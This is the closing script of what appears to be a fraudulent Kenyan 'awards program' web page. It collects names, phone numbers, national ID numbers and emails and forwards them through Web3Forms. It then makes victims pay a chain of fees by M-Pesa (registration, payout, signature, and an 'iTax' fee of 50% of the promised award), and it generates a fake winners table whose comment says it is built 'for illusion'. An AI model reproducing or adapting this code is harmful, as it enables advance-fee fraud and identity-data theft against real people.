        localStorage.setItem('selectedOption1', selectedOption1);
        localStorage.setItem('selectedSource', selectedSource);
        localStorage.setItem('selectedPurpose', selectedPurpose);
        localStorage.setItem('selectedPayoutOption', selectedPayoutOption);
        
        // Save M-Pesa confirmations
        localStorage.setItem('mpesa_regFee', mpesaConfirmations.regFee);
        localStorage.setItem('mpesa_payoutFee', mpesaConfirmations.payoutFee);
        localStorage.setItem('mpesa_signatureFee', mpesaConfirmations.signatureFee);
        localStorage.setItem('mpesa_itaxFee', mpesaConfirmations.itaxFee);
    }

    function navigateToPage(pageNumber) {
        // Clear error messages before changing page
        document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
        
        document.getElementById('page' + currentPage).classList.remove('active');
        currentPage = pageNumber;
        document.getElementById('page' + currentPage).classList.add('active');
        saveProgress(pageNumber);
        updateDynamicContent();
    }
    
    function goNext(fromPage) {
        navigateToPage(fromPage + 1);
    }

    function goBack(fromPage) {
        navigateToPage(fromPage - 1);
    }
    
    // Function to update content dependent on state variables
    function updateDynamicContent() {
        // Pre-fill M-Pesa text areas on load
        if (currentPage === 7) {
            document.getElementById('mpesaConfirmation').value = mpesaConfirmations.regFee;
            document.getElementById('regFeeConfirmationAmount').textContent = selectedAward.regFee || 'N/A';
        }
        if (currentPage === 8) {
            document.getElementById('mpesaPayoutConfirmation').value = mpesaConfirmations.payoutFee;
        }
        if (currentPage === 10) {
            document.getElementById('mpesaSignatureConfirmation').value = mpesaConfirmations.signatureFee;
        }
        if (currentPage === 12) {
            document.getElementById('itaxConfirmation').value = mpesaConfirmations.itaxFee;
        }
        
        if (currentPage === 6) {
            document.getElementById('finalPhoneNumber').textContent = registrationData.phoneNumber || 'N/A';
            document.getElementById('finalRegFeeAmount').textContent = 'Ksh ' + selectedAward.regFee;
            document.getElementById('finalAwardAmount').textContent = 'Ksh ' + selectedAward.awardAmount;
        }
        if (currentPage === 11) {
            document.getElementById('finalAwardConfirmation').textContent = selectedAward.awardAmount;
        }
        if (currentPage === 12) {
            // Calculate 50% iTax Fee
            const awardInt = parseInt(selectedAward.awardAmountInt) || 0;
            const itaxFee = Math.ceil(awardInt * 0.50);
            selectedAward.itaxFee = itaxFee; // Store calculated iTax fee
            localStorage.setItem('selectedAward', JSON.stringify(selectedAward)); // Save updated award data

            document.getElementById('itaxFeeDisplay').textContent = 'Ksh ' + itaxFee.toLocaleString('en-US');
            document.getElementById('itaxAwardAmount').textContent = selectedAward.awardAmount;
        }
        if (currentPage === 13) {
            updateDashboard();
        }
        if (currentPage === 14) {
             document.getElementById('finalDisbursementAwardAmount').textContent = selectedAward.awardAmount || 'N/A';
        }
        if (currentPage === 15) {
             generateAwardsTable();
        }
        
        // Re-highlight selections on reload/navigation
        if (currentPage === 1 && selectedOption1) {
            const element = document.getElementById('option' + (selectedOption1 === 'yes' ? 'Yes' : 'No'));
            if (element) element.classList.add('selected');
        }
        if (currentPage === 2 && selectedSource) {
            document.querySelectorAll('#page2 .options-container .option').forEach(opt => {
                if (opt.getAttribute('data-value') === selectedSource) {
                    opt.classList.add('selected');
                }
            });
            const otherInputContainer = document.getElementById('otherInputContainer');
             if (selectedSource === 'Other') {
                otherInputContainer.style.display = 'block';
             } else {
                otherInputContainer.style.display = 'none';
             }
        }
        if (currentPage === 3 && selectedPurpose) {
            document.querySelectorAll('#page3 .options-container .option').forEach(opt => {
                if (opt.getAttribute('data-value') === selectedPurpose) {
                    opt.classList.add('selected');
                }
            });
        }
        if (currentPage === 5 && selectedAward.regFee) {
             document.querySelectorAll('#page5 .options-container .option').forEach(opt => {
                if (opt.getAttribute('data-reg') === selectedAward.regFee) {
                    opt.classList.add('selected');
                }
            });
        }
        if (currentPage === 8 && selectedPayoutOption) {
             document.querySelectorAll('#page8 .payout-option').forEach(opt => {
                if (opt.getAttribute('data-option') === selectedPayoutOption) {
                    opt.classList.add('selected');
                    
                    // Show confirmation area if payout selected
                    const payoutFee = opt.getAttribute('data-fee');
                    document.getElementById('payoutFeeAmount').textContent = payoutFee;
                    document.getElementById('payoutMpesaPasteArea').style.display = 'block';
                }
            });
        }
        
        // Update button states after dynamic content update
        updateNextButtonState(currentPage);
    }
    
    function checkLastPage() {
        const lastPage = localStorage.getItem('lastPage');
        if (lastPage && isRegistered) {
            const pageNum = parseInt(lastPage);
            
            // Do not resume progress if already completed the process (Page 13 or higher)
            if (pageNum >= 13) {
                 navigateToPage(13); // Always show dashboard if completed
            } else if (pageNum >= 1 && pageNum <= 12) {
                // Resume progress if application started
                const confirmResume = confirm(`Welcome back! Do you want to continue your application from Step ${pageNum}?`);
                if (confirmResume) {
                    // Pre-fill Page 4 registration data if available
                    if (registrationData.fullName) {
                        document.getElementById('regEmailAddress').value = registrationData.email || '';
                        document.getElementById('fullName').value = registrationData.fullName || '';
                        document.getElementById('phoneNumber').value = registrationData.phoneNumber || '';
                        document.getElementById('county').value = registrationData.county || '';
                        document.getElementById('idNumber').value = registrationData.idNumber || '';
                    }
                    navigateToPage(pageNum);
                    return; 
                }
            }
        }
        // Default start page (Page 0)
        navigateToPage(0);
        // Load initial login state after navigating to page 0
        if (isRegistered) {
            toggleForm('login');
        } else {
            toggleForm('register');
        }
    }


    // --- Page 0 (Login/Register) Functions ---
    
    function toggleForm(type) {
        const loginForm = document.getElementById('loginForm');
        const registerForm = document.getElementById('registerForm');
        const navbar = document.getElementById('authNavbar');

        if (type === 'register') {
            loginForm.style.display = 'none';
            registerForm.style.display = 'block';
            navbar.textContent = 'Account Registration';
            
            if (isRegistered) {
                alert("You are already registered! Please use the login form.");
            }

        } else {
            loginForm.style.display = 'block';
            registerForm.style.display = 'none';
            navbar.textContent = 'Account Login';
        }
        
        // Pre-fill login email if registered
        if(registeredEmail) {
            document.getElementById('loginEmail').value = registeredEmail;
        }
        
        // Save current page state
        saveProgress(0);
    }

    function registerUser() {
        if (isRegistered) {
            alert("You are already registered! Please log in.");
            toggleForm('login');
            return;
        }
        
        const email = document.getElementById('regEmail').value.trim();
        const password = document.getElementById('regPassword').value;
        const confirmPassword = document.getElementById('confirmPassword').value;

        if (!email || password.length < 6 || password !== confirmPassword) {
            alert("Registration failed: Please ensure all fields are filled, password is at least 6 characters, and passwords match.");
            return;
        }
        
        // Save registration details to local storage
        localStorage.setItem('isRegistered', 'true');
        localStorage.setItem('registeredEmail', email);
        localStorage.setItem('registeredPassword', password);

        isRegistered = true;
        registeredEmail = email;
        registeredPassword = password;
        
        alert("Registration Successful! Your details have been saved. Proceeding to login.");
        toggleForm('login'); 
    }

    function loginUser() {
        const email = document.getElementById('loginEmail').value.trim();
        const password = document.getElementById('loginPassword').value;

        if (!isRegistered) {
            alert("Error: No registered account found. Please register first.");
            return;
        }
        
        // Check if entered credentials match the stored credentials (simulation)
        if (email === registeredEmail && password === registeredPassword) {
            alert("Login Successful! Proceeding to the Awards Program.");
            // When logging in successfully, check if there is an existing form progress, otherwise start from page 1
            const lastPage = localStorage.getItem('lastPage');
            if (lastPage && parseInt(lastPage) > 0) {
                 checkLastPage(); // Resumes progress
            } else {
                goNext(0); // Start from page 1
            }
        } else {
            alert("Login Failed: Incorrect email or password.");
        }
    }


    // --- M-Pesa Validation Functions ---

    // A helper function to get all current confirmation messages
    function getAllConfirmations(excludeId = null) {
        const confirmations = [];
        const ids = ['mpesaConfirmation', 'mpesaPayoutConfirmation', 'mpesaSignatureConfirmation', 'itaxConfirmation'];
        
        ids.forEach(id => {
            if (id !== excludeId) {
                const el = document.getElementById(id);
                if (el && el.value.trim().length > 0) {
                    confirmations.push(el.value.trim().toLowerCase());
                }
            }
        });
        return confirmations;
    }
    
    // Core function to check for uniqueness and update button state
    function checkUniqueMpesaMessage(page) {
        let textareaId;
        let confirmationKey;

        if (page === 7) {
            textareaId = 'mpesaConfirmation';
            confirmationKey = 'regFee';
        } else if (page === 8) {
            textareaId = 'mpesaPayoutConfirmation';
            confirmationKey = 'payoutFee';
        } else if (page === 10) {
            textareaId = 'mpesaSignatureConfirmation';
            confirmationKey = 'signatureFee';
        } else if (page === 12) {
            textareaId = 'itaxConfirmation';
            confirmationKey = 'itaxFee';
        } else {
            return; // Not a page with M-Pesa confirmation
        }

        const textarea = document.getElementById(textareaId);
        const errorElement = document.getElementById(textareaId + 'Error');
        const currentMessage = textarea.value.trim().toLowerCase();
        
        errorElement.style.display = 'none';

        if (currentMessage.length > 10) {
            const otherConfirmations = getAllConfirmations(textareaId);
            
            // Check for uniqueness against other confirmed payments
            if (otherConfirmations.includes(currentMessage)) {
                errorElement.textContent = "Error: This M-Pesa message has already been used for a previous fee. Please paste the correct, unique confirmation message.";
                errorElement.style.display = 'block';
                updateNextButtonState(page, false);
                return;
            }
            
            // Save the unique message to local storage and state
            mpesaConfirmations[confirmationKey] = currentMessage;
            saveProgress(currentPage); // Update local storage with the confirmation

        } else if (currentMessage.length > 0) {
             errorElement.textContent = "Please paste the full M-Pesa confirmation message (should be longer).";
             errorElement.style.display = 'block';
             updateNextButtonState(page, false);
             return;
        }
        
        // If message is valid and unique, update the next button state
        updateNextButtonState(page);
    }
    
    // --- General Selection and Validation Functions ---

    function updateNextButtonState(page, forceValid = null) {
        const button = document.getElementById(`page${page}NextButton`);
        let isValid = false;
        
        if (forceValid !== null) {
             isValid = forceValid;
        } else if (page === 2) {
            isValid = selectedSource && (selectedSource !== 'Other' || document.getElementById('otherInput').value.trim().length > 0);
        } else if (page === 3) {
            isValid = selectedPurpose !== null;
        } else if (page === 5) {
             isValid = selectedAward.regFee !== undefined;
        } else if (page === 7) {
            const message = document.getElementById('mpesaConfirmation').value.trim().toLowerCase();
            isValid = message.length > 10 && !getAllConfirmations('mpesaConfirmation').includes(message);
        } else if (page === 8) {
            const message = document.getElementById('mpesaPayoutConfirmation').value.trim().toLowerCase();
            isValid = selectedPayoutOption && message.length > 10 && !getAllConfirmations('mpesaPayoutConfirmation').includes(message);
        } else if (page === 10) {
            const message = document.getElementById('mpesaSignatureConfirmation').value.trim().toLowerCase();
            isValid = message.length > 10 && !getAllConfirmations('mpesaSignatureConfirmation').includes(message);
        } else if (page === 12) {
            const message = document.getElementById('itaxConfirmation').value.trim().toLowerCase();
            isValid = message.length > 10 && !getAllConfirmations('itaxConfirmation').includes(message);
        }

        if (button) {
            button.disabled = !isValid;
        }
    }
    
    function selectOption1(option) {
        // Clear previous selection visually
        document.querySelectorAll('#page1 .option').forEach(opt => opt.classList.remove('selected'));
        
        selectedOption1 = option;
        localStorage.setItem('selectedOption1', option);
        
        if (option === 'yes') {
            document.getElementById('optionYes').classList.add('selected');
        } else {
            document.getElementById('optionNo').classList.add('selected');
        }
    }

    function selectSource(element) {
        document.querySelectorAll('#page2 .options-container .option').forEach(opt => opt.classList.remove('selected'));
        element.classList.add('selected');
        selectedSource = element.getAttribute('data-value');
        localStorage.setItem('selectedSource', selectedSource);

        const otherInputContainer = document.getElementById('otherInputContainer');
        if (selectedSource === 'Other') {
            otherInputContainer.style.display = 'block';
        } else {
            otherInputContainer.style.display = 'none';
        }
        updateNextButtonState(2);
    }
    
    function validateOtherInput() {
         updateNextButtonState(2);
    }

    function selectPurpose(element) {
        document.querySelectorAll('#page3 .options-container .option').forEach(opt => opt.classList.remove('selected'));
        element.classList.add('selected');
        selectedPurpose = element.getAttribute('data-value');
        localStorage.setItem('selectedPurpose', selectedPurpose);
        updateNextButtonState(3);
    }

    // Function to handle form submission and validation on Page 4
    async function submitLoanForm(event) {
        event.preventDefault(); // Prevent default form submission
        
        const regEmailAddress = document.getElementById('regEmailAddress').value.trim();
        const fullName = document.getElementById('fullName').value.trim();
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const county = document.getElementById('county').value.trim();
        const idNumber = document.getElementById('idNumber').value.trim();

        if (!regEmailAddress || !fullName || !phoneNumber || !county || !idNumber) {
            alert("Please fill in all registration details including your email address.");
            return;
        }
        
        // 1. Prepare data for Web3Forms submission (AJAX/Fetch style recommended)
        const form = document.getElementById('registrationForm');
        
        // Manually update the hidden email field before submission
        document.getElementById('hiddenEmail').value = regEmailAddress;

        const formData = new FormData(form);
        
        // Add the purpose and source data to the submission
        formData.append('Award_Purpose', selectedPurpose || 'Not Selected');
        formData.append('Information_Source', selectedSource || 'Not Selected');
        
        // 2. Save local state data immediately before network attempt
        registrationData = { fullName, phoneNumber, county, idNumber, email: regEmailAddress };
        localStorage.setItem('registrationData', JSON.stringify(registrationData));
            
        try {
            const response = await fetch(form.action, {
                method: form.method,
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });

            if (response.ok) {
                console.log("Web3Forms submission successful!");
                alert("Registration details sent successfully! Proceeding to Award Selection.");
                goNext(4); // Move from Page 4 to Page 5
            } else {
                console.error("Web3Forms submission failed, but proceeding locally.");
                alert("Registration details validated locally. Proceeding to Award Selection.");
                goNext(4);
            }
        } catch (error) {
            console.error('Network Error:', error);
            alert("Registration details validated locally. Proceeding to Award Selection.");
            goNext(4);
        }
    }


    function selectAward(element) {
        document.querySelectorAll('#page5 .options-container .option').forEach(opt => opt.classList.remove('selected'));
        element.classList.add('selected');
        selectedAward = {
            regFee: element.getAttribute('data-reg'),
            awardAmount: element.getAttribute('data-award'),
            awardAmountInt: element.getAttribute('data-award-int') // Integer value for calculation
        };
        // Save selected award to local storage
        localStorage.setItem('selectedAward', JSON.stringify(selectedAward));
        
        updateNextButtonState(5);
    }

    function selectPayoutOption(element) {
        document.querySelectorAll('#page8 .payout-option').forEach(opt => opt.classList.remove('selected'));
        element.classList.add('selected');
        selectedPayoutOption = element.getAttribute('data-option');
        localStorage.setItem('selectedPayoutOption', selectedPayoutOption);
        
        const payoutFee = element.getAttribute('data-fee');
        
        document.getElementById('payoutFeeAmount').textContent = payoutFee;
        document.getElementById('payoutMpesaPasteArea').style.display = 'block';
        
        // Clear old confirmation and check state if option changes
        document.getElementById('mpesaPayoutConfirmation').value = mpesaConfirmations.payoutFee; 
        updateNextButtonState(8); 
    }
    
    function calculateTotalFees() {
        const regFee = parseInt(selectedAward.regFee) || 0;
        const payoutFee = (selectedPayoutOption === 'MPESA' ? PAYOUT_MPESA_FEE : 
                           selectedPayoutOption === 'KCB' ? PAYOUT_KCB_FEE : 
                           selectedPayoutOption === 'M banking account' ? PAYOUT_MOBILE_FEE : 0);
        
        const itaxFee = selectedAward.itaxFee || 0;

        return regFee + payoutFee + SIGNATURE_FEE + itaxFee;
    }
    
    function updateDashboard() {
        const totalFees = calculateTotalFees();
        const name = registrationData.fullName ? registrationData.fullName.split(' ')[0] : 'User';

        document.getElementById('dashboardGreeting').textContent = `Hello, ${name}!`;
        document.getElementById('dashboardAwardAmount').textContent = `Ksh ${selectedAward.awardAmount || 'N/A'}`;
        document.getElementById('dashboardPhoneNumber').textContent = registrationData.phoneNumber || 'N/A';
        document.getElementById('dashboardTotalFees').textContent = `Ksh ${totalFees.toLocaleString('en-US')}`;
        document.getElementById('dashboardPurpose').textContent = selectedPurpose || 'N/A';
        document.getElementById('dashboardDate').textContent = new Date().toLocaleDateString('en-US');
    }
    
    function generateAwardsTable() {
        const tableBody = document.getElementById('awardsTableBody');
        tableBody.innerHTML = ''; // Clear previous data
        
        const tableSize = 10;
        
        for (let i = 0; i < tableSize; i++) {
            // Cycle through the phone prefixes
            const prefix = PHONE_PREFIXES[i % PHONE_PREFIXES.length];
            
            // Generate masked phone number (first 4 digits from prefix, next 3 hidden, last 2 random, ending in '1')
            const phoneEnd = Math.floor(Math.random() * 10).toString() + '1'; // Ensures a similar ending for illusion
            const phoneNumber = `${prefix}*****${phoneEnd}`; 
            
            // Generate masked ID number (27*****9 pattern, first 2 digits, 5 asterisks, last 1 digit random)
            const idNumber = `${Math.floor(Math.random() * 8) + 1}7*****${Math.floor(Math.random() * 9) + 1}`; 
            
            // Cycle through the awards pool to ensure all are used
            const randomAmount = AWARDS_POOL[i % AWARDS_POOL.length];
            const formattedAmount = 'Ksh ' + randomAmount.toLocaleString('en-US');
            
            const row = tableBody.insertRow();
            row.insertCell().textContent = i + 1;
            row.insertCell().textContent = phoneNumber;
            row.insertCell().innerHTML = `<strong>${formattedAmount}</strong>`; // Amount (now centered by CSS)
            row.insertCell().textContent = idNumber;
        }
    }


    // Ensure initial button states and form context are correct on load
    document.addEventListener('DOMContentLoaded', () => {
        // Start the process by checking the last saved page
        checkLastPage();
        
        // Set up listeners for M-Pesa inputs
        document.getElementById('mpesaConfirmation').addEventListener('input', () => checkUniqueMpesaMessage(7));
        document.getElementById('mpesaPayoutConfirmation').addEventListener('input', () => checkUniqueMpesaMessage(8));
        document.getElementById('mpesaSignatureConfirmation').addEventListener('input', () => checkUniqueMpesaMessage(10));
        document.getElementById('itaxConfirmation').addEventListener('input', () => checkUniqueMpesaMessage(12));
        
        // Initial setup for buttons (needed only for initial load, then handled by navigation)
        updateNextButtonState(2);
        updateNextButtonState(3);
        updateNextButtonState(5);
        updateNextButtonState(7);
        updateNextButtonState(8);
        updateNextButtonState(10);
        updateNextButtonState(12);
        
        // Re-highlight initial selections if starting on a page that allows selection
        updateDynamicContent();
    });

</script>
</body>
</html>